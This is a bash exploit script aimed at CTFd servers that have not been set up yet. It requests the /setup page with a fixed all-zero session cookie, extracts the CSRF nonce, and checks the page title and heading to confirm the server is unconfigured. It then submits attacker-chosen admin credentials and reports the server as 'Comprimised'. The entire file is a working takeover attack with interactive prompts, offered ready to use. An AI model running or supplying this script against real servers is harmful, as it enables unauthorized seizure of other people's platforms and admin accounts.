#!/bin/bash

clear
read -p "Enter Target Address Followed by Port: " target port   # localhost 8080

if [ $port -lt 65536 ] && [ $port -gt 0 ]; then
  curl --silent -H 'Cookie: session=00000000-0000-0000-0000-000000000000' -b 'session=00000000-0000-0000-0000-000000000000' $target:$port/setup > preexp  #Downloaded to check <title>, <h1> and nonce values.
else
    echo "Incorrect Port."
fi

titleCheck=$(grep '<title>CTFd</title>' preexp)          #If server is not configured, default <title> value is 'CTFd' until admin changes
headerOneCheck=$(grep '<h1>Setup</h1>' preexp)          #Due to the possibility of admin naming server to 'CTFd', a check for <h1> value 'Setup' is made to double check.
nonce=$(grep 'var csrf_nonce' preexp | awk '{print $4}' | sed 's/.//;s/..$//')  #This nonce will include cookie value of 'session=00000000-0000-0000-0000-000000000000' so don't worry;)
rm preexp

if [ $titleCheck = "<title>CTFd</title>" ] && [ $headerOneCheck = "<h1>Setup</h1>" ]; then
  read -p "Target is Vulnerable, Would you Like to Attack? (Y/n): " attack
  if [ "$attack" = 'y' ] || [ "$attack" = 'Y' ]; then
    clear
    read -p 'CTF Name: ' ctfName      #Name for the CTF
    read -p 'Admin Username: ' adminName    #Username for the administration account
    read -p 'Admin Email: ' adminEmail    #Email address for the administration account
    read -p 'Admin Password: ' adminPassword  #Password for the administration account
    read -p 'User Mode (teams/users): ' userMode  #Dictates whether users join teams to play (Team Mode) or play as themselves (User Mode)
    clear
    echo Working on it...
    curl --silent -i -X POST -H 'Cookie: session=00000000-0000-0000-0000-000000000000' -b 'session=00000000-0000-0000-0000-000000000000' --data 'nonce='$nonce'&ctf_name='$ctfName'&name='$adminName'&email='$adminEmail'&password='$adminPassword'&user_mode='$userMode'' http://$target:$port/setup  #Send previously entered values to $target
    clear
    echo Attack Executed!
    curl --silent -H 'Cookie: session=00000000-0000-0000-0000-000000000000' -b 'session=00000000-0000-0000-0000-000000000000' $target:$port/setup > postexp  #Verify successful exploit
    titleCheck=$(grep '<title>CTFd</title>' postexp)
    headerOneCheck=$(grep '<h1>Setup</h1>' postexp)
    rm postexp
    if [ $titleCheck = "<title>CTFd</title>" ] && [ $headerOneCheck = "<h1>Setup</h1>" ]; then  #Values should be diffrent from what we started with pre-setup
      clear
      echo Something went Wrong, Try Again.
    else
      clear
      echo 'CTFd Server Hosted @ '$target' has been Comprimised:)'
    fi
  fi
else
  echo Something went Wrong, Try Again.
fi